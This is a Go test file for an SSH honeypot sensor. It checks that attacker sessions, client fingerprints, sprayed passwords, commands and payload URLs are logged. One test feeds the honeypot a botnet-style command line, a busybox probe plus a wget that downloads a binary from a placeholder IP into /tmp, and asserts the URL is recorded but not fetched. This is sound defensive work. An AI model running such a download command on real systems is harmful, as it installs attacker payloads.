package sshd_test

import (
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	gossh "golang.org/x/crypto/ssh"

	pb "github.com/honeynet/node/gen/honeynet/v1"
	"github.com/honeynet/node/internal/personality"
	"github.com/honeynet/node/internal/protocols/sshd"
)

// memSink collects envelopes in memory for assertions.
type memSink struct {
	mu   sync.Mutex
	envs []*pb.Envelope
}

func (m *memSink) Append(e *pb.Envelope) error {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.envs = append(m.envs, e)
	return nil
}

func (m *memSink) snapshot() []*pb.Envelope {
	m.mu.Lock()
	defer m.mu.Unlock()
	return append([]*pb.Envelope(nil), m.envs...)
}

func discardLogger() *slog.Logger {
	return slog.New(slog.NewTextHandler(io.Discard, &slog.HandlerOptions{Level: slog.LevelError}))
}

// startServer brings up a honeypot SSH listener on an ephemeral port.
func startServer(t *testing.T, seed string) (addr string, sink *memSink, p *personality.Personality) {
	t.Helper()

	p = personality.Derive(seed)
	sink = &memSink{}

	srv, err := sshd.New(sshd.Config{
		NodeID:           "test-node",
		Addr:             "127.0.0.1:0",
		HostKeyPath:      filepath.Join(t.TempDir(), "hostkey"),
		MaxSessions:      16,
		MaxSessionsPerIP: 8,
		IdleTimeout:      10 * time.Second,
		MaxDuration:      30 * time.Second,
	}, p, sink, discardLogger(), func() {})
	if err != nil {
		t.Fatalf("new server: %v", err)
	}

	ln, err := srv.Listen()
	if err != nil {
		t.Fatalf("listen: %v", err)
	}

	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan struct{})
	go func() {
		defer close(done)
		_ = srv.Serve(ctx, ln)
	}()
	t.Cleanup(func() {
		cancel()
		_ = ln.Close()
		select {
		case <-done:
		case <-time.After(5 * time.Second):
		}
	})

	return srv.Addr(), sink, p
}

// dial authenticates as the honeypot expects: repeated password attempts until
// the node grants access.
func dial(t *testing.T, addr, user string, passwords []string) *gossh.Client {
	t.Helper()

	attempt := 0
	cfg := &gossh.ClientConfig{
		User: user,
		Auth: []gossh.AuthMethod{
			gossh.RetryableAuthMethod(gossh.PasswordCallback(func() (string, error) {
				pw := passwords[attempt%len(passwords)]
				attempt++
				return pw, nil
			}), 8),
		},
		HostKeyCallback: gossh.InsecureIgnoreHostKey(), //nolint:gosec // connecting to our own test honeypot
		Timeout:         10 * time.Second,
	}

	client, err := gossh.Dial("tcp", addr, cfg)
	if err != nil {
		t.Fatalf("dial %s: %v", addr, err)
	}
	t.Cleanup(func() { _ = client.Close() })
	return client
}

func firstEvent[T any](envs []*pb.Envelope, extract func(*pb.Envelope) (T, bool)) (T, bool) {
	var zero T
	for _, e := range envs {
		if v, ok := extract(e); ok {
			return v, true
		}
	}
	return zero, false
}

// TestSSHSessionEndToEnd drives a real SSH client through the honeypot and
// asserts that the resulting event stream is what the collector expects.
func TestSSHSessionEndToEnd(t *testing.T) {
	addr, sink, p := startServer(t, "e2e-node")

	client := dial(t, addr, "root", []string{"wrongpass", "alsowrong", "123456", "admin", "root"})

	sess, err := client.NewSession()
	if err != nil {
		t.Fatalf("new session: %v", err)
	}
	defer func() { _ = sess.Close() }()

	out, err := sess.CombinedOutput("uname -a; /bin/busybox ECCHI; wget http://198.51.100.9/bins/x86 -O /tmp/y")
	if err != nil {
		t.Fatalf("run command: %v", err)
	}
	transcript := string(out)

	// The emulated responses must be plausible.
	if !strings.Contains(transcript, p.Hostname) {
		t.Errorf("transcript missing hostname %q:\n%s", p.Hostname, transcript)
	}
	if !strings.Contains(transcript, p.KernelRel) {
		t.Errorf("transcript missing kernel %q:\n%s", p.KernelRel, transcript)
	}
	if !strings.Contains(transcript, "ECCHI: applet not found") {
		t.Errorf("busybox probe answered wrong:\n%s", transcript)
	}

	// Give the closing events a moment to land.
	deadline := time.Now().Add(3 * time.Second)
	var envs []*pb.Envelope
	for time.Now().Before(deadline) {
		envs = sink.snapshot()
		if _, ok := firstEvent(envs, func(e *pb.Envelope) (*pb.SessionEnd, bool) {
			v := e.GetSessionEnd()
			return v, v != nil
		}); ok {
			break
		}
		time.Sleep(50 * time.Millisecond)
	}
	_ = client.Close()

	// --- SessionStart with a real client fingerprint ---
	start, ok := firstEvent(envs, func(e *pb.Envelope) (*pb.SessionStart, bool) {
		v := e.GetSessionStart()
		return v, v != nil
	})
	if !ok {
		t.Fatal("no SessionStart event recorded")
	}
	if start.Protocol != pb.Protocol_PROTOCOL_SSH {
		t.Errorf("protocol = %v, want SSH", start.Protocol)
	}
	if !strings.HasPrefix(start.ClientBanner, "SSH-2.0-") {
		t.Errorf("client banner = %q, want an SSH-2.0 banner", start.ClientBanner)
	}
	if len(start.KexAlgorithms) == 0 {
		t.Error("no KEX algorithms captured; the KEXINIT sniffer did not parse the handshake")
	}
	if len(start.Ciphers) == 0 {
		t.Error("no client ciphers captured")
	}
	if len(start.Hassh) != 32 {
		t.Errorf("HASSH = %q, want a 32-char MD5 hex digest", start.Hassh)
	}

	// --- Credentials, including the failures ---
	var auths []*pb.AuthAttempt
	for _, e := range envs {
		if a := e.GetAuthAttempt(); a != nil {
			auths = append(auths, a)
		}
	}
	if len(auths) < 2 {
		t.Fatalf("recorded %d auth attempts, want the full spray", len(auths))
	}
	if !auths[len(auths)-1].Success {
		t.Error("final auth attempt not marked successful")
	}
	for i, a := range auths[:len(auths)-1] {
		if a.Success {
			t.Errorf("auth attempt %d marked successful before the grant threshold", i)
		}
	}
	if auths[0].Password != "wrongpass" {
		t.Errorf("first captured password = %q, want %q", auths[0].Password, "wrongpass")
	}

	// --- Commands ---
	var cmds []*pb.CommandInput
	for _, e := range envs {
		if c := e.GetCommandInput(); c != nil {
			cmds = append(cmds, c)
		}
	}
	if len(cmds) != 1 {
		t.Fatalf("recorded %d command events, want 1 exec line", len(cmds))
	}
	if !strings.Contains(cmds[0].Raw, "busybox") {
		t.Errorf("command raw = %q, want the full exec line", cmds[0].Raw)
	}
	if !cmds[0].BulkInput {
		t.Error("exec-mode command not flagged bulk")
	}

	// --- The payload URL, captured but not fetched ---
	art, ok := firstEvent(envs, func(e *pb.Envelope) (*pb.ArtifactReference, bool) {
		v := e.GetArtifactReference()
		return v, v != nil
	})
	if !ok {
		t.Fatal("payload URL was not recorded as an artifact reference")
	}
	if art.Host != "198.51.100.9" {
		t.Errorf("artifact host = %q, want %q", art.Host, "198.51.100.9")
	}
	if art.Scheme != "http" || art.Port != 80 {
		t.Errorf("artifact scheme/port = %s/%d, want http/80", art.Scheme, art.Port)
	}
	if art.ViaTool != "wget" {
		t.Errorf("artifact tool = %q, want wget", art.ViaTool)
	}

	// --- Envelope invariants the collector relies on ---
	sessionIDs := map[string]bool{}
	for i, e := range envs {
		if e.NodeId != "test-node" {
			t.Errorf("envelope %d node_id = %q, want test-node", i, e.NodeId)
		}
		if e.SchemaVersion == 0 {
			t.Errorf("envelope %d has no schema version", i)
		}
		if e.TsNode == nil {
			t.Errorf("envelope %d has no node timestamp", i)
		}
		if e.SessionId != "" {
			sessionIDs[e.SessionId] = true
		}
	}
	if len(sessionIDs) != 1 {
		t.Errorf("events spread across %d session IDs, want 1", len(sessionIDs))
	}
}

// TestPublicKeyIsRecordedAndDeclined confirms the deliberate choice to decline
// key auth so that the client falls back and discloses its password list.
func TestPublicKeyIsRecordedAndDeclined(t *testing.T) {
	addr, sink, _ := startServer(t, "pubkey-node")

	_, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatalf("generate test key: %v", err)
	}
	signer, err := gossh.NewSignerFromKey(priv)
	if err != nil {
		t.Fatalf("signer from test key: %v", err)
	}

	attempt := 0
	cfg := &gossh.ClientConfig{
		User: "root",
		Auth: []gossh.AuthMethod{
			gossh.PublicKeys(signer),
			gossh.RetryableAuthMethod(gossh.PasswordCallback(func() (string, error) {
				attempt++
				return "hunter2", nil
			}), 8),
		},
		HostKeyCallback: gossh.InsecureIgnoreHostKey(), //nolint:gosec // our own test honeypot
		Timeout:         10 * time.Second,
	}

	client, err := gossh.Dial("tcp", addr, cfg)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	_ = client.Close()

	envs := sink.snapshot()
	var sawPubkey, sawPassword bool
	for _, e := range envs {
		a := e.GetAuthAttempt()
		if a == nil {
			continue
		}
		switch a.Method {
		case pb.AuthMethod_AUTH_METHOD_PUBLICKEY:
			sawPubkey = true
			if a.Success {
				t.Error("public key auth was granted; it must be declined to force password fallback")
			}
			if len(a.PublicKeySha256) != 64 {
				t.Errorf("public key digest = %q, want a 64-char SHA-256 hex", a.PublicKeySha256)
			}
			if a.PublicKeyType == "" {
				t.Error("public key type not recorded")
			}
		case pb.AuthMethod_AUTH_METHOD_PASSWORD:
			sawPassword = true
			if a.Password != "hunter2" {
				t.Errorf("captured password = %q, want hunter2", a.Password)
			}
		}
	}
	if !sawPubkey {
		t.Error("public key offer was not recorded")
	}
	if !sawPassword {
		t.Error("client never fell back to password; the credential list was not captured")
	}
}

// TestNodeStartsWithoutCollector confirms a sensor still records when the
// collector is unreachable, which is exactly when interesting things happen.
func TestNodeStartsWithoutCollector(t *testing.T) {
	addr, sink, _ := startServer(t, "offline-node")

	client := dial(t, addr, "admin", []string{"a", "b", "c", "d", "e", "f"})
	sess, err := client.NewSession()
	if err != nil {
		t.Fatalf("new session: %v", err)
	}
	defer func() { _ = sess.Close() }()

	if _, err := sess.CombinedOutput("id"); err != nil {
		t.Fatalf("run: %v", err)
	}
	if len(sink.snapshot()) == 0 {
		t.Error("no events recorded with no collector present")
	}
}

func TestMain(m *testing.M) {
	os.Exit(m.Run())
}
